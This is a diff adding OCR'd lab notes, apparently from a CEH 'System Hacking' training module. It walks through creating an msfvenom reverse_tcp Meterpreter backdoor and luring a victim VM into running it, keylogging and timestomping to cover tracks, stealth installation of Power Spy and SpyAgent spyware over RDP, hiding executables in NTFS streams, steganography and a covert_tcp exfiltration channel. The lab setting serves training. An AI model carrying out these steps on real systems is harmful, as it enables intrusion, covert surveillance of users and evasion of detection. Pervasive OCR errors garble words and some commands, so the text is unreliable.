@@ -308,3 +308,302 @@ hashes and displays them, as shown in the screenshot.
 
 Hack a Windows Machine using Metasploit and Perform PostExploitation using Meterpreter
 
+Type the command msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\xOO"
+LHOST=10.10.10.13 -f exe > Desktop/Backdoor.exe and press Enter.
+Note: Here, d1e localhost IP address is 10.10.10.13 (the Parrot Security virtual machine.)
+Type cp /root/Desktop/Backdoor.exe /var/www/htmllshare/ and press Enter to copy the file to the share folder.
+To share the file, you need to start the Apache server. Type the command service apache2 start and press Enter
+Now, type the command msfconsole and press Enter to launch Metasploit.
+14. Type use exploit/multi/handler and press Enter to handle exploits launched outside of d1e framework.
+15. Now, issue the following commands in msfconsole:
+Type set payload windows/meterpreter/reverse_tcp and press Enter
+Type set LHOST 10.10.10.13 and press Enter
+Type show options and press Enter; this lets you know the listening port
+To start the handler, type exploit -j -z and press Enter
+Switch to the Windows 10 virtual machine.
+18. Open any web browser (here, Mozilla Firefox) . In the address bar, type http://10.10.10.13/share and press Enter. As soon as you press enter, the
+system will display the shared folder contents, as shown in the screenshot.
+19. Click Backdoor.exe to download the file.
+Double-click the Backdoor.exe ftle. The Open File - Security Warning window appears; click Run.
+Leave the Windows 10 virtual machine nuuúng and switch to the Parrot Security virtual machine.
+23. The Meterpreter session has successfully been opened
+Type sessions -i 1 and press Enter (here, 1 speciftes the ID number of the session). The Meterpreter shell is launched, as shown in the screenshot
+Type sysinfo and press Enter. Issuing this command displays target machine information such as computer name, OS, and domain
+Type ipconfig and press Enter. This displays the victim machine's IP address, MAC address, and other information.
+Type getuid and press Enter to display that the Meterpreter session is running as an administrator on the host.
+28. Type pwd and press Enter to view the current working directory on the victim machine.
+Type ls and press Enter to list the files in the current working directory
+To read the contents of a text file, type cat <filename.txt> (here, secret.txt) and press Enter
+Now, we will change the MACE attributes of the secret.exe file.
+To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file.
+32. To view the mace attributes of secret.txt, type timestomp secret.txt -v and press Enter. This displays the created time, accessed time, modified
+time, and entry modified time, as shown in the screenshot
+To change the MACE value, type timestomp secret.txt -m "02/11/2018 08:1 0:03" and press Enter. This command changes the Modified value of the secret.txt file.
+Note: -m: specifies the modified value.
+34. You can see the changed Modified value by issuing the command timestomp secret.txt -v.
+Similarly, you can change the Accessed (-a), Created (-e), and Entry Modified (-e) values of a particular file.
+36. The cd command changes the present working directory. As you know, the current working directory is C:\Users\Admin\Downloads. Type cd C:/
+and press Enter to change the current remote directory to C.
+Now, type pwd and press Enter and observe that the current remote directory has changed to the c drive
+
+Here, the download command can be used to download a file from the remote machine to the host machine. To do so, type download <Filename.extension> and press Enter.
+39. The ftle will be downloaded to the Home or root folder of the host machine (here, the Parrot Security virtual machine).
+40. You can also use a search command that helps you to locate ftles on the target machine. This type of command is capable of searching through
+the whole system or can be limited to speciftc folders.
+41. Type search -f <Filename.extension> (here pagefile.sys) and press Enter. This displays the location of the searched file.
+Now that you have successfully exploited the system, you can perform post-exploitation maneuvers such as key-logging. Type keyscan_start
+and press Enter to start capturing all keyboard input from the target system.
+Now, switch to the Windows 10 virtual machine, create a text file, and start typing something
+Switch to the Parrot Security virtual machine, type keyscan_dump, and press Enter. This dumps all captured keystrokes
+Type idletime and press Enter to display the amount of time for which the user has been idle on the remote system.
+You can also type shutdown and press Enter to shutdown the victim machine after performing post-exploitation
+
+Power Spy
+In the Windows Server 2019 virtual machine, login with the credentials Administrator Pa$$w0rd.
+Click Remote Desktop Connection
+The Remote Desktop Connection window appears. In the Computer field, type the target system's IP address here, 10.10.10.16 [Windows Server 2016]) and click Connect
+The Windows Security pop-up appears; enter the credentials Jason and qwerty and click OK.
+Note: Here, we are using the t.arget system user credentials obtained from the previous lab
+Navigate to Z:\CEHv11 Module 06 System Hacking\Spyware\General Spyware\Power Spy and copy setup.exe.
+Switch to the Remote Desktop Connection window and paste the setup.exe file on the target system's Desktop.
+The Setup - Power Spy window appears; click Next. Follow the installation wizard to install Power Spy using the default settings
+After the installation completes, the Completing the Power Spy Setup Wizard appears; click Finish
+The Run as Administrator window appears; click Run.
+Note: If the Welcome To Power Spy Control Panel! webpage appears, close the browser.
+The Setup login password window appears. Enter the password test@123 in the New password and Confirm password fields; click Submit.
+The lnformation dialog box appears; click OK.
+The Enter login password window appears; enter the password that you set in Step 15; click Submit.
+The Power Spy Control Panel window appears,
+Click the Start monitoring option from the right-pane.
+Note: If the System Reboot Recommended window appears, click OK
+Click on Stealth Mode from the right-pane.
+Note: Stealth mode runs Power Spy on the computer completely invisibly.
+The Hotkey reminder pop-up appears; read it carefully and click OK.
+Note: To unhide Power Spy, use the Ctri+Ait+X keys together on your PC keyboard
+In the Confirm dialog-box that appears, click Y es.
+24. Delete the Power Spy installation setup (setup.exe) from Desktop.
+25. Close the Remote Desktop Connection by clicking on the close icon (X).
+N ote: If a Remote Desktop Connection pop-up appears saying Your remote
+session will be disconnected, click OK.
+26. Now, switch to the Windows Server 2016 virtual macl1ine and login with the credentials Jason and qwerty.
+Note: Here, we are running the target machine as a legitimare user.
+Note: Here, for demonstration purposes, we are using the trial version of the Power Spy tool. The trial version will always show a notification in the topright
+comer of the Desktop on the target machine, even when the software is set to stealth mode
+Open the Internet Explorer web browser and browse any website.
+Note: In this lab, we are browsing the Gmail and Linkedln websites.
+28. Once you have performed sorne user activities, close all windows. Click the Start icon in the bottom left-hand comer of Desktop, click the user
+icon and click Sign out. You will be signed out from Jason's account.
+Switch back to the Windows Server 2019 virtual machine and follow Steps 3 - 6 to latmch a Remote Desktop Connection.
+30. Close the Server Manager window.
+31. To bring Power Spy out of Stealth Mode, press the Ctri+Ait+X keys.
+32. The Run as administrator window appears; click Run.
+Note: If a User Account Control pop-up appears, click Yes
+The Enter login password window appears; en ter the password that you set in Step 15; click Submit.
+Note: Here, the password is test@123.
+In the Register product window, click Later.
+35. The Power Spy Control Panel window appears. Click on Stop monitoring to stop monitoring the user activities
+Click Applications executed from the options to check the applications running on the target system
+A window appears, showing the applications runnmg on the target system, as shown in the screenshot.
+Note: The image on the screen might differ in your lab environment, depending on the user activities you performed earlier as a victim
+Click the Websites Visited option from the left-hand pane to view the websites opened by the victim.
+Note: The image on the screen might differ in your lab environment, depending on the user activities you performed earlier as a victim.
+Similarly, you can click on other options such as Screenshots, Windows
+Opened, Clipboard, and Event History to check other detailed information.
+Note: Using this method, an attacker might attempt to install keyloggers and thereby gain information related to the websites visited by the victim,
+keystrokes, password details, and other information
+
+Spytech SpyAgent
+We will first establish a remote connection with
+the target machine and later install the keylogger spyware (Here, Spyware SpyAgent) to capture keystrokes and monitor the other activities of the user
+A Remote Desktop connection is successfully established.
+6. Close the Server Manager window and minimize Remote Desktop Connection.
+7. Navigate to Z:\CEHv11 Module 06 System Hacking\Spyware\General Spyware and copy the Spytech SpyAgent folder.
+8. Switch to d1e Remote Desktop Connection window and paste the Spytech SpyAgent folder on target system's Desktop, as shown in the screenshot
+Open the Spytech SpyAgent folder and double-click the Setup (password=spytech) application
+The Spytech SpyAgent Setup window appears; click Next. Follow the installation wizard and install Spytech SpyAgent using the default settings
+In the Select SpyAgent lnstallation Type window, ensure that the Administratortrester radio button is selected; click Next
+In the Ready To Instan window, click Next.
+13. The Spytech SpyAgent Setup pop-up appears, asking Would you like to include an uninstaller?; click Yes
+The Spytech SpyAgent folder location window appears; close the window
+The Finished window appears; ensure that the Run SpyAgent checkbox is selected and click Close
+The Spytech SpyAgent dialog box appears; click Continue ....
+Note: If the Thank you for downloading SpyAgent! webpage appears, close the browser.
+The Welcome to SpyAgent (Step 1) wizard appears; click click to continue
+Enter the password test@123 in the New Password and Confirm Password fields; click OK.
+Note: You can set the password of your choice
+The password changed pop-up appears; click OK.
+The Welcome to SpyAgent (Step 2) wizard appears; click click to continue.
+The Easy Configuration and Setup Wizard appears. In the Configuration section, ensure that the Complete + Stealth Configuration radio button is
+selected and click Next
+In the Extras section, select the Load on Windows Startup checkbox and click Next.
+In the Confirm Settings section, click Next to continue.
+25. In the Apply section, click Next; in rl1e Finish section, click Finish.
+26. The spytech SpyAgent main window appears, along with the Welcome to SpyAgent! (Step 3) setup wizard; click click to continue •••.
+If a Getting Started dialog box appears, click No.
+28. In the spytech SpyAgent main window, click Start Monitoring in the bottom-left comer.
+The Enter Access Password pop-up appears; enter the password you specified in Step 19 and click OK.
+Note: Here, the password is test@123.
+The Stealth Notice window appears; read the insttuctions carefully, and then click OK.
+Note: To bring SpyAgent out of stealth mode, press the Ctri+Shift+Alt+M keys.
+The spytech SpyAgent pop-up appears. Select rl1e Do not show this Help
+Tip again and Do not show Related Help Tips like this again checkboxes and click click to continue •••.
+Remove d1e Spytech SpyAgent folder from Desktop.
+33. Close Remote Desktop Connection by clicking on me close icon (X) .
+Note: If a Remote Desktop Connection pop-up appears saying Your remote session will be disconnected, click OK.
+34. Now, switch tome Windows Server 2016 virtual machine and log in with the credentials .Jason and qwerty.
+Note: Here, we are running me target machine as a legitimate user.
+35. Open the Internet Explorer web browser and browse any website
+Note: In this lab, we are browsing the Gmail and Linkedln websites.
+36. Once you have performed some user activities, close all windows. Click the Start icon from the bottom left-hand comer of the Desktop, click the user (icon) and 
+click Sign out. You will be signed out from Jason's account.
+Switch back to d1e Windows Server 2019 virtual machine and follow
+Steps 1 - 4 to latmch Remote Desktop Connection.
+38. Close d1e Server Manager window.
+Note: If a SpyAgent ttial version pop-up appears, click continue ....
+39. To bring Spytech SpyAgent out of steald1 mode, press d1ey
+Ctri+Shift+Ait+M keys.
+40. The Enter Access Password pop-up appears; enter d1e password from
+Step 19 and click OK.
+Note: Here, the password is test@123.
+The spytech SpyAgent window appears; click KEYBOARD & MOUSE, and then click View Keystrokes Log from the resulting options
+SpyAgent displays all the resultant keystrokes tmder the Keystrokes Typed  section. You can click any of the captured keystrokes to view detailed
+information in d1e field below.
+Note: The screenshot here might differ from the image on your screen, depending upon the user activities you performed earlier
+Click the Scr-nshots option from the left-hand pane to view the captured screenshot of the user activities. Similarly, in Email Activity
+under the Screenshots options, you can view the email accotmt accessed by the user on the target system .
+Navigate back to the spytech SpyAgent main window. Click Website Usage, and then click View Websites Logged
+SpyAgent displays all the user-visited website results along with the start time, end time, and active time, as shown in the screenshot
+Similarly, yo u can select each tile and further explore the tool by clicking
+various options such as Windows Viewed, Program Usage, and Events Timeline, Files & Documents, Computer Usage.
+47. Once you have fmished, close all o pen windows; close Remote Desktop Connection.
+
+NTFS Streams
+NTFS is a file
+system that stores any file wid1 the help of two data streams, called TFS data streams, along with file attributes. The first data stream stores the security
+descriptor for d1e file to be stored such as permissio ns; the second stores the data within a file. Alternate data streams are another type of named data stream that
+can be present within each file. Here, we will use TFS streams to hide a malicious file on the target system.
+1. On the Windows Server 2019 virtual machine, ensure that the C: drive file system is in NTFS fonnat. To do so, navigate to This PC, right-click
+Local Disk (C:), and click Properties
+The Local Disk (C:) Properties window appears; check for the File system format (NTFS) and click OK.
+Now, go to the C: drive, create a New Folder, and name it magic .
+4. Navigate to the location C:\Windows\System32, copy calc.exe, and paste it to the C:lmagic location
+In the Command Prompt, type cd C:\magic, and press Enter to navigate to the magic folder on the C: drive
+Now, type notepad readme.txt and press Enter to create a new file at the C:\magic location
+A Notepad pop-up appears; click Yes to create a readme.txt file
+The readme.txt - Notepad file appears; write some text in it
+Click File, and then Save to save me file.
+Close the readme.txt notepad file
+In the Command Prompt, type dir and press Enter. This action lists all the files present in the directory, along with their file sizes. Note the file
+size of readme.txt.
+Now, type type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe and press Enter. This command will hide calc.exe inside the readme.txt
+In the Command Prompt, type dir and press Enter. Note the file size of readme.txt, which should not change.
+Navigate to the directory C:\magic and delete calc.exe.
+In the Command Prompt, type mklink backdoor.exe readme.txt:calc.exe and press Enter
+Now, type backdoor.exe and press Enter. The calculator program will execute, as shown in the screenshot
+Note: For demonstration purposes, we are using the same machine to execute and hide files using NTFS streams. In real-time, attackers may hide malicious files
+in the target system and keep them invisible from the legitimate users by using NTFS streams, and may remotely execute rl1em whenever required.
+18. This concludes the demonstration of how to hide malicious files using NTFS streams
+
+White Space Steganography SNOW
+
+Here, we will hide data using the Whitespace steganography tool Snow.
+1. Turn on the Windows 10 virtual machine and log in wid1 the credentials Admin and Pa$$w0rd.
+2. Navigate to E:\CEH-Tools\CEHv11 Module 06 System Hacking\Steganography Tools\Whitespace Steganography Tools, copy the Snow folder, and paste it on Desktop.
+3. Create a Notepad file, type Helio World!, and press Enter; then, long-press the hyphen key to draw a dashed line below the text. Save the file as
+readme.txt in the folder where SNOW.EXE (C:\Users\Admin\Desktop\Snow) is located.
+Now, Click Type here to search at the bottom of Desktop and type cmd.
+Click Command Prompt from the results.
+5. In the Command Prompt window, type cd C:\Users\Admin\Desktop\Snow and press Enter 
+6. Type snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt and press Enter.
+(Here, magic is the password, but you can type your desired password. readme2.txt is the name of the file that will automatically be created in the
+same location.)
+Now, the data ("My Swiss bank account number is 45656684512263") is hidden inside the readme2.txt file with the contents of readme.txt.
+8. The file readme2.txt has become a combination of readme.txt + My Swiss bank account number is 45656684512263.
+9. Now, type snow -C -p "magic" readme2.txt. it will show the content of readme.txt (the password is magic, which was entered while hiding the data
+in Step 6).
+To check the file in the GUI, open the readme2.txt in Notepad, and go to Edit -> Select All. You will see the hidden data inside readme2.txt in the
+form of spaces and tabs, as shown in the screenshot.
+
+OpenStego
+Navigate to Z:\CEHv11 Module 06 System Hacking\Steganography Tools\lmage Steganography Tools\OpenStego and double-click SetupOpenStego-0. 7.3.exe.
+Note: If a User Account Control pop-up appears, click yes.
+3. The OpenStego Setup window appears; click I Agree. installation wizard and install the tool using the default settings.
+4. In the lnstallation Complete wizard, click Close
+Click the Start menu in the bottom-left comer of Desktop. Click Run OpenStego from the applications list to launch OpenStego.
+Click the ellipsis button next to the Message File section.
+The Open - Select Message File window appears. Navigate to Z:\CEHv11 Module 06 System Hacking\Steganography Tools\Image Steganography Tools\OpenStego, select 
+New Text Document.txt, and click Open. Assume the text file contains sensitive infonnation such as credit card and pin numbers.
+The location of the selected file appears in the Message File field.
+Click the ellipsis button next to Cover File
+The Open-Select Cover File window appears. Navigate to Z:\CEHv11 Module 06 System Hacking\Steganography Tools\lmage Steganography Tools\OpenStego, select lsland.jpg, 
+and click Open
+Now, both Message File and Cover File are uploaded. By performing steganography, the message file will be hidden in d1e designated cover file.
+Click the ellipsis button next to Output Stego File
+The Save - Select Output Stego File window appears. Choose the location where you want to save d1e file. In this lab, the location chosen is Desktop.
+Provide the file name Stego and click Open
+In the OpenStego window, click the Hide Data button.
+A Success pop-up appears, stating that the message has been successfully embedded; then, click OK.
+Minimize the OpenStego window. The image containing the secret message appears on Desktop. Double-click the image file (Stego.bmp) to view it.
+19. You will see the image, but not the contents of the message (text file) embedded in it
+Close the Photos viewer window, switch to the OpenStego window, and click Extract Data in the left-pane. 
+Click the ellipsis button next to Input Stego File .
+The Open-Select Input Stego File window appears. Navigate to Desktop, select Stego.bmp, and click Open.
+Click the ellipsis button next to Output Folder for Message File
+The Select Output Folder for Message File window appears. Choose a location to save the message file (here, Desktop) and click Open
+In the OpenStego window, click the Extract Data button. This will extract the message file from the image and save it to Desktop.
+The Success pop-up appears, stating d1at the message ftle has been
+successfully extracted from the cover ftle; d1en, click OK.
+27. The extracted image ftle (New Text Docume nt .txt) is displayed on Desktop.
+28. Close the OpenStego window, navtgate to Desktop, and doubleclick New Text Document.txt.
+29. The file displays all the information contained in the text document, as shown in the screenshot.
+
+Covert Channels using Covert_TCP
+
+we will use Covert_ TCP to crea te a covert channel between the two machines.
+Turn on Parrot Security virtual machine.
+Note: Ensure that the Windows 10 virtual machine is running
+A Parrot Terminal window appears. In d1e terminal window, type cd Desktop and press Enter
+Type mkdir Send and press Enter to create a folder named Send on Desktop
+Type cd Send and press Enter to change the current working directory to the Send folder
+Now, type echo "Secret Message" > message.txt and press Enter to make a new text file named message containing the string "Secret Message."
+Now, open any explorer window and press Ctrt+L. The Location field appears; type smb://10.10.10.10 and press Enter to access Windows 10 shared folders.
+9. The security pop-up appears; enter the Windows 10 virtual machine credentials (Usemame: Admin and Password: Pa$$w0rd) and click Connect.
+10. The Windows shares on 10.10.10.10 window appears; double-click the CEH-Tools folder.
+Navigate to CEHv11 Module 06 System Hacking\Covering Tracks Tools\Covert_TCP and copy the covert_tcp.c file; close the window
+Now, navigate to the Send folder on Desktop and paste the covert_tcp.c file in this folder
+Switch back to the Terminal window, type cc -o covert_tcp covert_tcp.c, and press Enter. This compiles the covert_tcp.c file
+Switch to the Ubuntu virtual machine, log in with the username Ubuntu and password toor, and press Enter to sign in.
+15. Scroll down the Favorites bar in the left-hand pane of the window and click on the Terminal icon to launch Terminal
+In the Terminal window, type sudo su and press Enter to gain super-user access
+Type tcpdump -nvvx port 8888 -i lo and press Enter to start a tcpdump
+Now, leave the tcpdump listener running and click on the top of the Terminal window to open a new terminal window.
+A new Terminal tab appears; type the commands below to create, and then navigate to the Receive folder on Desktop:
+• cd Desktop
+• mkdir Receive
+• cd Receive
+Now, click on Files in the left-hand pane of Desktop. The home window appears; click on + Other Locations from the left-hand pane of the window
+The + Other Locations window appears; type smb://10.10.10.10 in the Connect to Server field and click the Connect button
+Navigate to CEHv11 Module 06 System Hacking\Covering Tracks Tools\Covert_TCP and copy the covert_tcp.c file; close the window
+Now, navigate to the Receive folder on Desktop and paste the covert_tcp.c file into the folder 
+Switch back to the Terminal window, type cc -o covert_tcp covert_tcp.c,and press Enter. This compiles the covert_tcp.c file
+To start a listener, type ./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 9999 -dest_port 8888 -server -file
+/home/ubuntu/Desktop/Receive/receive.txt and press Enter, 
+Now, switch back to the Parrot Secwity virtual machine. Click Applications in the top-left comer of Desktop and navigate to Pentesting -> lnformation
+Gathering -> wireshark
+Minimize Wireshark and switch back to the Terminal window.
+34. Type sudo ./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Sendlmessage.txt and
+press Enter to start sending the contents of message.txt file over tcp
+covert_ tcp starts sending the string one character at a time,
+Go to Ubuntu and go to the terminal and observe the message
+Close this Terminal tab; open the first terminal tab running and press Ctrl+C to stop tcpdump.
+Note: If a Close this terminal? pop-up appears, click Close Terminal.
+39. Observe that tcpdump shows that no packets were captured in the network,as shown in the screenshot; then, close the Terminal window
+Now, navigate to /home/ubuntu/Desktop/Receive and double-click the receive.txt file to view its contents
+Click the Stop capturing packets icon in Wireshark
+In the Apply a display filter ••• field, type tcp and press Enter to view only the TCP packets,
+If you examine the commmúcation bet:ween the Parrot Secuñty and Ubuntu virtual machines (here, 10.10.10.13 and 10.10.10.9, respectively), you will
+find each character of the message string being sent in individual packets over the net:work, as shown in the following screenshots.
+45. Covert_tcp changes the header of rl1e tcp packets and replaces it, one character at a time, with the characters of rl1e string in order to send the
+message wid1out being detected.
+
+Auditpol
